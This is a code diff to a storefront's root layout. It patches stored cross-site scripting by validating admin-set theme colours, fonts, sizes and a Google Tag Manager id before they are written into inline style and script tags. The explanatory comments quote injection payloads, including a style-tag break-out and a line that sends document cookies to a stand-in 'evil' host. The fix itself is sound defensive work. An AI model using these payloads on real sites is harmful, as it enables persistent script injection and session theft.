@@ -9,6 +9,7 @@ import PushRegister from "@/components/push-register";
 import PushNudge from "@/components/push-nudge";
 import { getSettings, publicSettings } from "@/lib/settings";
 import { clean } from "@/lib/search";
+import { safeCssValue, safeCssFontStack, safeCssInteger, safeGoogleTagId, safeAspectRatio } from "@/lib/sanitize";
 
 export const viewport: Viewport = {
   width: "device-width",
@@ -103,7 +104,9 @@ export default async function RootLayout({ children }: { children: React.ReactNo
       <html lang="en" suppressHydrationWarning>
         <head>
           <script dangerouslySetInnerHTML={{ __html: `(function(){try{var m=localStorage.getItem("sz_theme")||"system";var d=m==="dark"||(m==="system"&&matchMedia("(prefers-color-scheme: dark)").matches);document.documentElement.setAttribute("data-theme",d?"dark":"light");}catch(e){document.documentElement.setAttribute("data-theme","light");}})();` }} />
-          <style dangerouslySetInnerHTML={{ __html: `:root{--bg:${theme.bg || "#faf9f7"};--text:${theme.text || "#141414"};}` }} />
+          {/* Validated, not interpolated raw: theme.bg comes from Admin → Settings and lands
+              inside a <style> element, where `red}</style><script>…` breaks out. */}
+          <style dangerouslySetInnerHTML={{ __html: `:root{--bg:${safeCssValue(theme.bg, "#faf9f7")};--text:${safeCssValue(theme.text, "#141414")};}` }} />
         </head>
         <body>
           <div style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", textAlign: "center", padding: 24, background: "var(--bg)", color: "var(--text)" }}>
@@ -116,18 +119,36 @@ export default async function RootLayout({ children }: { children: React.ReactNo
       </html>
     );
   }
+  /* Every value below is interpolated into a <style> element on EVERY page of the site.
+     They all originate in Admin → Settings, so a value is not trusted just because an
+     admin typed it: a MARKETING/ADMIN account that is phished or compromised could
+     otherwise plant `red}</style><script>…` and get persistent script execution on the
+     storefront for all customers and all other admins. Each setting is therefore
+     re-validated against the shape it is supposed to have (colour, font stack, integer,
+     ratio) and silently falls back to nothing when it does not match. See lib/sanitize.ts. */
+  const bg = safeCssValue(theme.bg);
+  const text = safeCssValue(theme.text);
+  const accent = safeCssValue(theme.accent);
+  const headingFont = safeCssFontStack(theme.headingFont);
+  const bodyFont = safeCssFontStack(theme.bodyFont);
+  const radius = safeCssInteger(theme.radius);
+  const containerWidth = safeCssInteger(theme.containerWidth);
+  const imgRatio = safeAspectRatio(theme.productImageRatio);
   const cssVars = `
     :root {
-      ${theme.bg ? `--bg:${theme.bg};` : ""}
-      ${theme.text ? `--text:${theme.text};` : ""}
-      ${theme.accent ? `--accent:${theme.accent};` : ""}
-      ${theme.headingFont ? `--font-head:${theme.headingFont};` : ""}
-      ${theme.bodyFont ? `--font-body:${theme.bodyFont};` : ""}
-      ${theme.radius != null ? `--radius:${theme.radius}px;` : ""}
-      ${theme.productImageRatio ? `--img-ratio:${String(theme.productImageRatio).replace(":", " / ")};` : "--img-ratio:3 / 4;"}
-      ${theme.containerWidth ? `--container:${theme.containerWidth}px;` : ""}
+      ${bg ? `--bg:${bg};` : ""}
+      ${text ? `--text:${text};` : ""}
+      ${accent ? `--accent:${accent};` : ""}
+      ${headingFont ? `--font-head:${headingFont};` : ""}
+      ${bodyFont ? `--font-body:${bodyFont};` : ""}
+      ${radius ? `--radius:${radius}px;` : ""}
+      --img-ratio:${imgRatio};
+      ${containerWidth ? `--container:${containerWidth}px;` : ""}
     }`;
-  const gtmId = cfg?.integrations?.gtmId || "";
+  /* Google Tag Manager ids have a rigid shape (GTM-XXXXXXX). It was interpolated raw into
+     an inline <script>, so `');fetch('//evil/'+document.cookie);//` closed the string and
+     ran arbitrary code site-wide — from an account that only needs the "settings" perm. */
+  const gtmId = safeGoogleTagId(cfg?.integrations?.gtmId);
   return (
     <html lang="en" suppressHydrationWarning>
       <head>
